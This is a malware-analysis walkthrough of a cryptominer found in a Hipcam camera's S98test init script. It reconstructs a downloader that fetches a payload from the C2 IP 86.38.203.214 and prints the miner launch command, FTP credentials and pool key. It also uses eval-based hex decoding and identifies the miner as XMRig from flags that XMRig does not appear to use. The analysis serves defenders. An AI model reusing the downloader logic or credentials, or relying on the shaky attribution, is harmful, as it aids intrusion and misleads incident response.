# Forensic Investigation Methodology

## Step-by-step walkthrough of the Hipcam malware discovery

---

## 1. Initial Reconnaissance — "What is this box?"

```
Goal: Understand what the device IS, not just what it runs.
```

| Check | Command | What we learned |
|-------|---------|-----------------|
| Kernel | `uname -a` | Linux 3.4.43-gk armv6l, built Apr 2017 |
| CPU info | `cat /proc/cpuinfo` | ARM1176JZF-S, Goke GK7102 |
| Memory | `cat /proc/meminfo` | 41 MB total, ~18 MB free |
| Storage | `cat /proc/mtd` | JFFS2 on mtdblock3 |
| Users | `cat /etc/passwd` | root, default (no password hash!) |
| Processes | `ps aux` | ipc_server, onvif, telnetd, watchdog + suspicious entries |
| Network | `netstat -tlnp` | 80 (HTTP), 554 (RTSP), 8080 (ONVIF), 23 (telnet) |
| Shell history | `cat /root/.ash_history` | All investigation commands logged — found in JFFS2 dump |

---

## 2. Persistence Audit — "What runs at boot?"

```
Goal: Find how malware (or any unexpected software) survives reboots.
```

### Checked
```
/etc/init.d/     → System V init scripts
/etc/crontab     → (did not exist)
/etc/inittab     → BusyBox init configuration
/mnt/mtd/ipc/run → Custom boot script (runs after init scripts)
```

### Finding: S98test

```sh
$ ls -la /etc/init.d/S98test
-rwxrw-rw-  1 root root 10234 Aug 22 2023 S98test
```

**Red flags:**
1. World-writable (rw-rw-rw-) — any process can modify it
2. Name `test` — deliberately deceptive, not a service name
3. Size 10,234 bytes — far too large for a simple init script
4. Date Aug 22 2023 — 34 months old, no other file dates match

### Normal init script vs. malware

```
NORMAL                               MALWARE
========                             =======
#!/bin/sh                            #!/bin/sh
# Start telnet daemon                echo -ne '\x7F\x45\x4C\x46...' > /tmp/dl
telnetd -l /bin/sh &                 echo -ne '\x23\x21\x2F\x62...' > /tmp/r
                                     chmod 777 /tmp/dl /tmp/r
                                     ping wait loop
                                     /tmp/r &
```

---

## 3. Binary Extraction — "What is this hex doing here?"

```
Goal: Extract and identify the embedded binary payloads.
```

### Technique: Hex-to-binary conversion

The `echo -ne '\xNN\xNN...'` syntax writes raw bytes. Each `\xNN` is one byte in hex.

```python
hex_str = r'\x7F\x45\x4C\x46\x01\x01\x01\x00...'
binary = bytes(eval('b"' + hex_str.replace('"', '').replace("'", '').strip() + '"'))
open('dl.bin', 'wb').write(binary)
```

### Identification

```sh
$ file dl.bin
dl.bin: ELF 32-bit LSB executable, ARM, EABI4 version 1 (SYSV),
        statically linked, stripped
```

The file command reads the ELF magic bytes and header to identify:
- **32-bit** — not 64-bit
- **LSB** — little-endian byte order (ARM default on Linux)
- **ARM** — target CPU architecture
- **Statically linked** — no shared library dependencies
- **Stripped** — debugging symbols removed (anti-analysis)

---

## 4. String Extraction — "What does this binary do?"

```
Goal: Understand program behavior without disassembling.
```

### Technique: `strings`

```sh
$ strings dl.bin
GET /omm HTTP/1.0
HOST: 86.38.203.214
Connection: close
./omm
NIF
GCC: (Buildroot 2017.05) 4.9.4
ARM926EJ-S
```

**Why strings works:** Compilers store literal string constants in the binary's `.rodata` section. `strings` scans for printable ASCII sequences and prints them. Before ANY disassembler, always run strings first.

### What the strings reveal

| String | Forensic meaning |
|--------|-----------------|
| `GET /omm HTTP/1.0` | HTTP downloader — fetches a file from a web server |
| `86.38.203.214` | C2 server IP address |
| `Connection: close` | HTTP/1.0 behavior — single request per connection |
| `./omm` | Output filename — saves to current directory |
| `NIF` | Response validation — checks if server returned valid data |
| `Buildroot 2017.05` | Compilation environment — embedded Linux build system |
| `ARM926EJ-S` | Target CPU of dropper binary (compiled for ARMv5TEJ; actual SoC is Goke GK7102 ARM1176JZF-S ARMv6) |

### What the C code probably looks like

From these strings alone, we can reconstruct the program logic:

```c
socket() → connect("86.38.203.214", 80) → 
write("GET /omm HTTP/1.0\r\nHOST: 86.38.203.214\r\nConnection: close\r\n\r\n") →
read() loop → write() to "./omm" → close()
```

---

## 5. ELF Header Analysis — "What is the binary's structure?"

```
Goal: Understand the executable format: entry point, segments, target.
```

### Manual parsing with Python

```python
import struct
data = open('dl.bin', 'rb').read()

# Verify ELF magic
assert data[:4] == b'\x7fELF'

# Parse the 32-bit ELF header (little-endian)
e_type, e_machine, _, e_entry, e_phoff, e_shoff, e_flags, \
e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx = \
    struct.unpack_from('<HHIIIIIHHHHHH', data, 16)

print(f'Type: {"executable" if e_type == 2 else "shared"}')
print(f'Machine: {e_machine} (40=ARM)')
print(f'Entry point: 0x{e_entry:08x}')
print(f'Segments: {e_phnum}')
```

### ELF Header Fields (32-bit)

```
Offset  Size  Name        Description
─────────────────────────────────────────
0x00    16    e_ident     Magic + class + endianness + ABI
0x10    2     e_type      2=ET_EXEC, 3=ET_DYN
0x12    2     e_machine   40=ARM, 62=x86_64
0x18    4     e_entry     Virtual address of first instruction
0x1C    4     e_phoff     Program Header Table file offset
0x20    4     e_shoff     Section Header Table file offset
0x2E    2     e_phnum     Number of program headers
0x32    2     e_shnum     Number of section headers
```

### Key Finding: Static Linking

The binary has NO `PT_INTERP` segment (which would specify the dynamic linker). This means:
- No dependency on `/lib/ld-linux.so.3` or any `.so` files
- Runs on any Linux kernel version
- Cannot be stopped by deleting shared libraries
- Larger file size, but operates independently

---

## 6. Command-Line Flag Analysis — "What software is this?"

```
Goal: Identify unknown software from its command-line arguments.
```

The runner script launches:
```sh
/bin/omm -device-name=hi_$macaddr -accept-tos \
         -email=hwansna@gmail.com \
         -password=Y_rLkZXgn3BQ02lRFV6E5
```

### Flag Decomposition

| Flag | Common Software | Purpose |
|------|----------------|---------|
| `-device-name` | XMRig | Worker/rig identifier for pool dashboard |
| `-accept-tos` | XMRig | Pool Terms of Service acceptance |
| `-email` | XMRig, ccminer | Pool account login |
| `-password` | XMRig | Worker password or API key |

### Elimination: What it ISN'T

| Malware family | Would have these flags | Matches? |
|---------------|----------------------|----------|
| Mirai | `-t <ip>` (DDoS target) | ✗ No attack target |
| Gafgyt | `-p <port> -m <method>` (DDoS method) | ✗ No DDoS params |
| Tsunami/Kaiten | `-s <server>` (IRC server) | ✗ No IRC connection |
| Hajime | No command flags (all config compiled-in) | ✗ Uses flags |
| BrickerBot | No flags (single-purpose) | ✗ Uses flags |

### File Size Confirmation

- Expected size: **2,222,096 bytes**
- This is ~2.1 MB — the exact size of a statically-linked XMRig ARM build
- Mirai bots are ~100 KB, shells are ~40 KB
- Only cryptominers with OpenSSL are this large

**Conclusion: XMRig Monero miner, build for ARM926EJ-S, using statically-linked toolchain.**

---

## 7. Shell Script Forensics — "How does the runner work?"

```
Goal: Understand the persistence and resilience mechanisms.
```

### Decoding the runner

The second hex dump starts with `\x23\x21\x2F\x62\x69\x6E\x2F\x73\x68`:
- `\x23` = `#`
- `\x21` = `!`
- `\x2F\x62\x69\x6E\x2F\x73\x68` = `/bin/sh`

This is the **shebang** — the first two bytes of any shell script.

### Full decode

```python
hex_runner = r'\x23\x21\x2F\x62...'
script = bytes(eval('b"' + hex_runner.replace('"', '').replace("'", '').strip() + '"'))
print(script.decode('utf-8'))
```

### Resilience Mechanisms

1. **Device fingerprinting** — MAC address → unique worker ID
2. **Silent operation** — all output redirected to /dev/null
3. **Integrity check** — file size verified before launch
4. **Auto-recovery** — deleted/corrupted binary re-downloaded in <4 seconds
5. **Dual transport** — HTTP primary, FTP fallback
6. **Infinite loop** — runs until the system dies

---

## 8. IOC Extraction — "What do we share with the security community?"

```
Goal: Produce actionable indicators for detection and blocking.
```

### Network IOCs

```
86.38.203.214:80     HTTP GET /omm
86.38.203.214:21     FTP (pwn:XAUob5EHu7M54iyD)
```

### Host IOCs

```
/etc/init.d/S98test  (world-writable, contains hex payloads)
/tmp/dl              (ARM ELF downloader, 1924 bytes)
/tmp/r               (runner shell script)
/bin/omm             (XMRig miner, 2222096 bytes)
```

### Behavioral IOCs

```
Process: /bin/omm -device-name=hi_* -email=hwansna@gmail.com
Cron/loop: sleep 4 → launch → size check → re-download
Connection: TCP to 86.38.203.214:80 (HTTP) or :21 (FTP)
```

### Attribution IOCs

```
Email:    hwansna@gmail.com
FTP:      pwn / XAUob5EHu7M54iyD
Pool key: Y_rLkZXgn3BQ02lRFV6E5
```

---

## Summary: The 6 Techniques

| # | Technique | What it found |
|---|-----------|--------------|
| 1 | **Persistence audit** | S98test: world-writable, hex payloads, deceptive name |
| 2 | **Hex dump decode** | Extracted ARM ELF binary and shell script |
| 3 | **String extraction** | C2 IP, HTTP request, compiler, target CPU |
| 4 | **ELF header parse** | Architecture (ARMv5TE), entry point, static linking |
| 5 | **Flag analysis** | XMRig miner, pool credentials, attacker email |
| 6 | **Infection chain** | Initial access → boot persistence → payload deploy → mining |
